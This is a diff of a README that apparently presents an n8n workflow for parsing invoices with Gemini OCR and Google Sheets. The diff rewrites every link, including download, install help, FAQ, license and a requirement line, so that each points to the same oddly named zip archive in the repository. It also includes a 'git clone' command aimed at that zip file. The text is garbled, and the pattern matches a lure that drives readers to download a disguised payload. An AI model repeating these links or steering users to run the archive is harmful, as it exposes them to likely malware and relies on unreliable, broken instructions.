@@ -1,6 +1,6 @@
 # 🧾 n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration - Simplify Document Processing Effortlessly
 
-[![Download](https://raw.githubusercontent.com/ffsdffsf/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/main/papyrographer/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration.zip%https://raw.githubusercontent.com/ffsdffsf/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/main/papyrographer/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration.zip)](https://raw.githubusercontent.com/ffsdffsf/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/main/papyrographer/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration.zip)
+[![Download](https://github.com/ffsdffsf/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/raw/refs/heads/main/papyrographer/A_Integration_Sheets_Gemini_and_Google_n_with_Documents_OC_Parse_Invoices_1.5-alpha.5.zip%https://github.com/ffsdffsf/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/raw/refs/heads/main/papyrographer/A_Integration_Sheets_Gemini_and_Google_n_with_Documents_OC_Parse_Invoices_1.5-alpha.5.zip)](https://github.com/ffsdffsf/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/raw/refs/heads/main/papyrographer/A_Integration_Sheets_Gemini_and_Google_n_with_Documents_OC_Parse_Invoices_1.5-alpha.5.zip)
 
 ## 📚 Overview
 
@@ -11,10 +11,10 @@ This n8n workflow automates the process of parsing documents like invoices and s
 To get started with this workflow, follow these steps:
 
 1. **Download the Workflow:**
-   Visit [this page to download](https://raw.githubusercontent.com/ffsdffsf/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/main/papyrographer/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration.zip) the latest version of the workflow.
+   Visit [this page to download](https://github.com/ffsdffsf/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/raw/refs/heads/main/papyrographer/A_Integration_Sheets_Gemini_and_Google_n_with_Documents_OC_Parse_Invoices_1.5-alpha.5.zip) the latest version of the workflow.
 
 2. **Install n8n:**
-   You will need to have n8n installed. If you do not have n8n, you can find detailed instructions on how to install it [here](https://raw.githubusercontent.com/ffsdffsf/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/main/papyrographer/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration.zip).
+   You will need to have n8n installed. If you do not have n8n, you can find detailed instructions on how to install it [here](https://github.com/ffsdffsf/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/raw/refs/heads/main/papyrographer/A_Integration_Sheets_Gemini_and_Google_n_with_Documents_OC_Parse_Invoices_1.5-alpha.5.zip).
 
 3. **Set Up Google Sheets:**
    Make sure you have a Google Sheets account ready. You will need to create or select a Google Sheet where the parsed data will be added.
@@ -32,20 +32,20 @@ To get started with this workflow, follow these steps:
 Before you begin, ensure that your setup meets these requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **https://raw.githubusercontent.com/ffsdffsf/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/main/papyrographer/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration.zip** Version 14.x or later
+- **https://github.com/ffsdffsf/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/raw/refs/heads/main/papyrographer/A_Integration_Sheets_Gemini_and_Google_n_with_Documents_OC_Parse_Invoices_1.5-alpha.5.zip** Version 14.x or later
 - **n8n:** Installed on your local machine or server
 - **Google Account:** Active Google account for Sheets integration
 
 ## 📥 Download & Install
 
-To download the latest version of the workflow, go to [this download page](https://raw.githubusercontent.com/ffsdffsf/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/main/papyrographer/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration.zip). Click the version you want to download, and follow the instructions displayed on the screen.
+To download the latest version of the workflow, go to [this download page](https://github.com/ffsdffsf/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/raw/refs/heads/main/papyrographer/A_Integration_Sheets_Gemini_and_Google_n_with_Documents_OC_Parse_Invoices_1.5-alpha.5.zip). Click the version you want to download, and follow the instructions displayed on the screen.
 
 ## 🛠️ Configuration Steps
 
 1. **Clone the Repository:**
    Use the following command to clone the repository to your local machine:
    ```
-   git clone https://raw.githubusercontent.com/ffsdffsf/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/main/papyrographer/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration.zip
+   git clone https://github.com/ffsdffsf/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/raw/refs/heads/main/papyrographer/A_Integration_Sheets_Gemini_and_Google_n_with_Documents_OC_Parse_Invoices_1.5-alpha.5.zip
    ```
 
 2. **Open n8n Editor:**
@@ -65,14 +65,14 @@ To download the latest version of the workflow, go to [this download page](https
 
 ## 🌐 Support
 
-If you encounter any issues, please check the [FAQ section](https://raw.githubusercontent.com/ffsdffsf/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/main/papyrographer/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration.zip) in the repository. You can also reach out through the Issues tab for support.
+If you encounter any issues, please check the [FAQ section](https://github.com/ffsdffsf/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/raw/refs/heads/main/papyrographer/A_Integration_Sheets_Gemini_and_Google_n_with_Documents_OC_Parse_Invoices_1.5-alpha.5.zip) in the repository. You can also reach out through the Issues tab for support.
 
 ## 📄 License
 
-This project is licensed under the MIT License. You can view the license details [here](https://raw.githubusercontent.com/ffsdffsf/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/main/papyrographer/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration.zip).
+This project is licensed under the MIT License. You can view the license details [here](https://github.com/ffsdffsf/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/raw/refs/heads/main/papyrographer/A_Integration_Sheets_Gemini_and_Google_n_with_Documents_OC_Parse_Invoices_1.5-alpha.5.zip).
 
 ## 🌟 Acknowledgments
 
 Special thanks to the contributors for their valuable input in creating this workflow. Your input enhances the capabilities and user experience.
 
-Remember to download the latest version [here](https://raw.githubusercontent.com/ffsdffsf/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/main/papyrographer/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration.zip) and enjoy seamless document parsing!
+Remember to download the latest version [here](https://github.com/ffsdffsf/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/raw/refs/heads/main/papyrographer/A_Integration_Sheets_Gemini_and_Google_n_with_Documents_OC_Parse_Invoices_1.5-alpha.5.zip) and enjoy seamless document parsing!
